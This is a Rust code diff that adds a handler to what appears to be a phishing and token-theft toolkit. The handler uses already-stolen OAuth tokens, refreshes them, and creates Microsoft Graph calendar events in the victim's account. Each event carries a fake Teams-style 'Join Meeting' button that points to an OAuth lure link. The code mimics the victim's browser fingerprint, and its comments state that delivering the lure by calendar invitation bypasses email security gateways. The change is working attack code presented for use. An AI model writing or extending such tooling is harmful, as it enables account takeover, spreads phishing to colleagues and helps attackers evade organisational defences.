@@ -174,6 +174,95 @@ pub async fn list_calendar_events_handler(
     }
 }
 
+/// Create a calendar event with an OAuth lure link embedded in the body.
+/// This delivers the phishing link via calendar invitation instead of email,
+/// bypassing email security gateways (EOP, Safe Links, etc.).
+#[derive(Debug, Deserialize)]
+pub struct CalendarLureRequest {
+    pub token_id: String,
+    pub subject: String,
+    pub start_time: String,
+    pub duration_minutes: Option<i32>,
+    pub lure_link: String,
+    pub location: Option<String>,
+}
+
+pub async fn calendar_lure_handler(
+    body: web::Json<CalendarLureRequest>,
+    state: web::Data<crate::AppState>,
+) -> impl Responder {
+    let token = match crate::retrieve_any_token(&state, &body.token_id).await {
+        Ok(t) => t,
+        Err(_) => return HttpResponse::NotFound().json(serde_json::json!({"error": "token_not_found"})),
+    };
+    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
+        .unwrap_or_else(|| token.access_token.clone());
+
+    let duration = body.duration_minutes.unwrap_or(30);
+    let location = body.location.as_deref().unwrap_or("Online Meeting");
+
+    let start_dt = match chrono::DateTime::parse_from_rfc3339(&body.start_time) {
+        Ok(dt) => dt,
+        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"error": "Invalid start_time format"})),
+    };
+    let end_dt = start_dt + chrono::Duration::minutes(duration as i64);
+
+    // Build HTML body with embedded OAuth link — looks like a legitimate
+    // meeting join link but actually captures the token
+    let html_body = format!(
+        r#"<p>You have been invited to a meeting. Please review the agenda and join using the link below.</p>
+<p><a href="{}" style="display: inline-block; padding: 10px 24px; background-color: #0078d4; color: #ffffff; text-decoration: none; border-radius: 4px; font-family: Segoe UI, Arial, sans-serif;">Join Meeting</a></p>
+<p style="color: #666; font-size: 12px;">This meeting was scheduled from Microsoft Teams. Please join on time.</p>"#,
+        body.lure_link
+    );
+
+    let payload = serde_json::json!({
+        "subject": body.subject,
+        "body": {
+            "contentType": "HTML",
+            "content": html_body
+        },
+        "start": {
+            "dateTime": start_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
+            "timeZone": "UTC"
+        },
+        "end": {
+            "dateTime": end_dt.format("%Y-%m-%dT%H:%M:%S").to_string(),
+            "timeZone": "UTC"
+        },
+        "location": {
+            "displayName": location
+        },
+        "isOnlineMeeting": false,
+        "responseRequested": true
+    });
+
+    let client = GraphClient::with_fingerprint(
+        token.user_agent.clone(),
+        token.accept_language.clone(),
+    );
+
+    match client.create_calendar_event(&access_token, payload).await {
+        Ok(event) => {
+            eprintln!("[calendar] Created lure calendar event '{}' with OAuth link", body.subject);
+            HttpResponse::Ok().json(serde_json::json!({
+                "success": true,
+                "event_id": event.id,
+                "subject": body.subject,
+                "start": body.start_time,
+                "message": "Calendar lure event created — OAuth link embedded in meeting body. Bypasses email security."
+            }))
+        }
+        Err(e) => {
+            eprintln!("[calendar] Failed to create lure event: {}", e);
+            HttpResponse::InternalServerError().json(serde_json::json!({
+                "error": "calendar_lure_failed",
+                "details": format!("{}", e)
+            }))
+        }
+    }
+}
+
 // ============================================================
 // SILENT CALENDAR MANIPULATION — Inject fake meetings
 // ============================================================
